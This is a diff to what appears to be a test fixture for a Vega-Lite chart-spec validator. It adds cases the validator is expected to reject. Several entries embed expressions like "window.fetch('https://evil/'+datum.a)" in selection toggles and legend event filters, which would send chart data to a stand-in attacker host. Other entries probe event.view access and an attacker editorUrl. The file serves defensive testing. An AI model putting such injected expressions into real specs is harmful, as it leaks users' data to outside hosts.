@@ -86,5 +86,17 @@
   {"name": "unknown mark", "rules": ["schema"],
    "spec": {"data": {"name": "d"}, "mark": "iframe"}},
   {"name": "unknown top-level key", "rules": ["schema"],
-   "spec": {"data": {"name": "d"}, "mark": "point", "loader": {"baseURL": "https://evil.example/"}}}
+   "spec": {"data": {"name": "d"}, "mark": "point", "loader": {"baseURL": "https://evil.example/"}}},
+  {"name": "select toggle expression", "rules": ["expression"],
+   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "params": [{"name": "p", "select": {"type": "point", "toggle": "window.fetch('https://evil/'+datum.a)"}}]}},
+  {"name": "select toggle global call", "rules": ["expression"],
+   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "params": [{"name": "p", "select": {"type": "point", "toggle": "fetch('https://evil')"}}]}},
+  {"name": "bind legend event filter", "rules": ["expression"],
+   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "params": [{"name": "p", "select": {"type": "point", "fields": ["a"]}, "bind": {"legend": "click[window.fetch('https://evil')]"}}]}},
+  {"name": "bind legend event object filter", "rules": ["expression"],
+   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "params": [{"name": "p", "select": {"type": "point", "fields": ["a"]}, "bind": {"legend": {"type": "click", "filter": "window.fetch('https://evil')"}}}]}},
+  {"name": "computed event view access", "rules": ["expression"],
+   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "transform": [{"calculate": "event['view']", "as": "z"}]}},
+  {"name": "usermeta embed options", "rules": ["config"],
+   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "usermeta": {"embedOptions": {"actions": true, "editorUrl": "https://evil.example", "ast": false}}}}
 ]
